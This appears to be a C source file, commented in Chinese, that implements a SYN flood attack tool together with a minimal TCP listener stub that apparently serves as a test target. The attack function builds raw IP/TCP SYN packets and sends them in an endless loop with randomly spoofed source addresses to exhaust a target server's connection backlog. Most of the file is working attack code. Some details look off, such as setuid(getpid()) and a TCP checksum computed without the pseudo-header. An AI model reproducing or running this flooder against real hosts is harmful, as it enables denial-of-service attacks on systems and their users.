#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/tcp.h>
#include <signal.h>
#include <time.h>

//============================
#define MAX_BUF     1024        /* Maximum bytes fetched by a single read() */

//
//
int sock_fd = 0;
int server_sockfd = 0;

/**
 *
 */
void getCurDateTime(char* buf, int size) {
    if (buf == NULL)
        return;
    static const char *wday[] = { "Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat" };
    time_t timep;
    struct tm *p;
    time(&timep);
    p = localtime(&timep); //get current time.
    snprintf(buf, size, "%d/%d/%d %s %d:%d:%d", 1900 + p->tm_year, 1 + p->tm_mon, p->tm_mday, wday[p->tm_wday], p->tm_hour, p->tm_min, p->tm_sec);
    //printf ("%d%d%d ", (1900+p->tm_year), (l+p->tm_mon), p->tm_mday);
    //printf("%s%d:%d:%d\n", wday[p->tm_wday], p->tm_hour, p->tm_min, p->tm_sec);
}

static void signal_handler(int signo) {
    if (sock_fd != 0) {
        close(sock_fd); //close server_sockfd
    }
    if (server_sockfd != 0) {
        close(server_sockfd); //close server_sockfd
    }
    exit(EXIT_SUCCESS); //exit now
}

static void init_signal_handle() {
    if (signal(SIGINT, signal_handler) == SIG_ERR) {
        printf("Cannot handle SIGINT ! \n");
        exit(EXIT_FAILURE);
    }
    if (signal(SIGTERM, signal_handler) == SIG_ERR) {
        printf("Cannot handle SIGTERM ! \n");
        exit(EXIT_FAILURE);
    }
    if (signal(SIGQUIT, signal_handler) == SIG_ERR) {
        printf("Cannot handle SIGQUIT ! \n");
        exit(EXIT_FAILURE);
    }
}

//我们自己写的攻击函数
void attack(int skfd, struct sockaddr_in *target, unsigned short srcport);
//如果什么都让内核做，那岂不是忒不爽了，咱也试着计算一下校验和。
unsigned short check_sum(unsigned short *addr, int len);

//int main(int argc,char** argv){
int main_stub_tcp_attack(int argc, const char* argv[]) {
    //int sock_fd;
    struct sockaddr_in target;
    struct hostent *host;
    const int on = 1;
    unsigned short srcport;

    if (argc < 4) {
        printf("Usage:%s <target_ip> <dstport> <srcport> \n", argv[0]);
        exit(1);
    }

    bzero(&target, sizeof(struct sockaddr_in));
    target.sin_family = AF_INET;
    target.sin_port = htons(atoi(argv[2]));

    if (inet_aton(argv[1], &target.sin_addr) == 0) {
        host = gethostbyname(argv[1]);
        if (host == NULL) {
            printf("TargetName Error:%s\n", hstrerror(h_errno));
            exit(1);
        }
        target.sin_addr = *(struct in_addr *) (host->h_addr_list[0]);
    }

    //将协议字段置为IPPROTO_TCP，来创建一个TCP的原始套接字
    if (0 > (sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP))) {
        perror("Create Error");
        exit(1);
    }

    //用模板代码来开启IP_HDRINCL特性，我们完全自己手动构造IP报文
    if (0 > setsockopt(sock_fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on))) {
        perror("IP_HDRINCL failed");
        exit(1);
    }

    init_signal_handle();

    //因为只有root用户才可以play with raw socket :)
    setuid(getpid());
    srcport = atoi(argv[3]);

    printf("Start attacking %s:%s now... \n", argv[1], argv[2]);
    attack(sock_fd, &target, srcport);

    return 0;
}

//在该函数中构造整个IP报文，最后调用sendto函数将报文发送出去
void attack(int skfd, struct sockaddr_in *target, unsigned short srcport) {
    char buf[128] = { 0 };
    struct ip *ip;
    struct tcphdr *tcp;
    int ip_len;

    //在我们TCP的报文中Data没有字段，所以整个IP报文的长度
    ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    //开始填充IP首部
    ip = (struct ip*) buf;

    ip->ip_v = IPVERSION;
    ip->ip_hl = sizeof(struct ip) >> 2;
    ip->ip_tos = 0;
    ip->ip_len = htons(ip_len);
    ip->ip_id = 0;
    ip->ip_off = 0;
    ip->ip_ttl = MAXTTL;
    ip->ip_p = IPPROTO_TCP;
    ip->ip_sum = 0;
    ip->ip_dst = target->sin_addr;

    //开始填充TCP首部
    tcp = (struct tcphdr*) (buf + sizeof(struct ip));
    tcp->source = htons(srcport);
    tcp->dest = target->sin_port;
    tcp->seq = random();
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->check = 0;

    while (1) {
        //源地址伪造，我们随便任意生成个地址，让服务器一直等待下去
        ip->ip_src.s_addr = random();
        tcp->check = check_sum((unsigned short*) tcp, sizeof(struct tcphdr));
        sendto(skfd, buf, ip_len, 0, (struct sockaddr*) target, sizeof(struct sockaddr_in));
    }
}

//关于CRC校验和的计算，网上一大堆，我就“拿来主义”了
unsigned short check_sum(unsigned short *addr, int len) {
    register int nleft = len;
    register int sum = 0;
    register unsigned short *w = addr;
    short answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1) {
        *(unsigned char *) (&answer) = *(unsigned char *) w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

int main_tcpserver_stub(int argc, const char* argv[]) {
    unsigned short portnum = 0;

    if (argc < 2) {
        printf("Usage: %s [port] \n", argv[0]);
        printf("\t port : port number needed and  be greater than 2000.\n");

        return -1;
    }
    //=========
    init_signal_handle();

    portnum = atoi(argv[1]);
    if (portnum <= 2000 || portnum >= 65535) {
        printf("Port Number:%s must between 2000 - 65535 .\n", argv[1]);
        return -1;
    }

    ///定义sockfd
    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);

    ///定义sockaddr_in
    struct sockaddr_in server_sockaddr;
    server_sockaddr.sin_family = AF_INET;
    server_sockaddr.sin_port = htons(portnum);
    server_sockaddr.sin_addr.s_addr = htonl(INADDR_ANY);

    ///bind，成功返回0，出错返回-1
    if (bind(server_sockfd, (struct sockaddr *) &server_sockaddr, sizeof(server_sockaddr)) == -1) {
        perror("bind");
        exit(-1);
    }

    ///listen，成功返回0，出错返回-1
    ///proc/sys/net/ipv4/tcp_max_syn_backlog ,default value is 128
    if (listen(server_sockfd, 0) == -1) {
        perror("listen");
        exit(-1);
    }

    {
        char strTime[MAX_BUF];
        getCurDateTime(strTime, sizeof(strTime) - 1);
        printf("\n\t *** TCP Multithread Server program ***\n\n");
        printf("[%s] Server start at port %d now ......\n", strTime, portnum);
    }

    while(1){//loop for client to connect in...
        int client_fd = accept(server_sockfd,NULL,NULL); //

        close(client_fd);
    }
    close(server_sockfd);

    return 0;
}
